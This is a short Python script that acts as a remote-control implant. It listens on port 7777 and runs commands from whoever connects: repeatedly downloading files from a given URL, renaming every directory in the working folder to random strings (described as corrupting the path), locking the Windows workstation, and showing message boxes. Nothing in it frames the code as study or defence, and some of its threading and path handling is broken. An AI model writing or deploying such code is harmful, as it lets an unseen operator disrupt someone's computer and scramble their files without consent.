import random
import urllib.request
import string
import threading
import os,shutil
import socket,json
def commandparser(data):
    commands = {"download" : download,"dirrnm" : dirrnm,"dny" : dny,"msg" : msg}
    data = "".join(data.split("@"))
    data = data.split(" -")
    command = {"command" : data[0]}
    data.pop(0)
    for kwargs in data:
        if kwargs == "s":
            command.update({"s" : 1})
        else:
            kwargs = kwargs.split(" ")
            command.update({str(kwargs[0]) : kwargs[1]})
    commandtoCall = command["command"]
    command.pop("command")
    commands[commandtoCall](command)
    
def download(data):
    if "s" in data.keys():
        data.pop("s")
        threading.Thread(target=download, args = (data))
        return
    if "u" not in data.keys():
        print("The correct way to use this command is @download -u url followed by: \n -e for the extension of the file \n -i for the ammount of downloads")
    else:
        url = data["u"]
        data.pop("u")
        if "e"  not in data.keys():
            ext = ".txt"
        else:
            ext = data["e"]
            data.pop("e")
        if "i" not in data.keys():
            iterations = 1
        else:
            iterations  = int(data["i"])
            data.pop("i")
        if len(data.keys()) == 0:
            for i in range(iterations):
                urllib.request.urlretrieve(url,''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))+str(ext))
        else:
            print("The correct way to use this command is @download -u url followed by: \n -e for the extension of the file \n -i for the ammount of downloads")
    
def dirrnm(data):
    if "s" in data.keys():
        data.pop("s")
        threading.Thread(target=dirrnm, args = (data))
    if "p" not in data.keys():
        path = os.getcwd()
    else:
        path = int(data["p"])
    if len(data.keys()) == 0:
        path = os.getcwd()
        directories = [ x for x in os.listdir('.') if os.path.isdir(x) ]
        for dirs in directories:
            try:
                os.rename(str(path)+dirs,str(path)+str(''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))))
            except FileNotFoundError:
                pass
    else:
        print("The correct way to use this command is @dirrnm followed by: \n -p to specify the path to corrupt")

def dny(data):
    import ctypes
    ctypes.windll.user32.LockWorkStation()
def msg(data):
    from tkinter import messagebox,Tk
    if "t" in data.keys():
        title = data["t"]
        data.pop("t")
        if "m" in data.keys():
            message = data["m"]
            data.pop("m")
        else:
            message = ""
        root = Tk()
        messagebox.showinfo(title, message)
        root.withdraw()
    else:
        print("The correct way to use this command is @msg -t to define the title followed by: \n -m for the message under the title.")
ip = socket.gethostbyname(socket.gethostname())
print(ip)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 7777                                        
s.bind((ip, port))
s.listen(2)
conn,addr = s.accept()
while 1:
    data = conn.recv(1024).decode()
    commandparser(data)

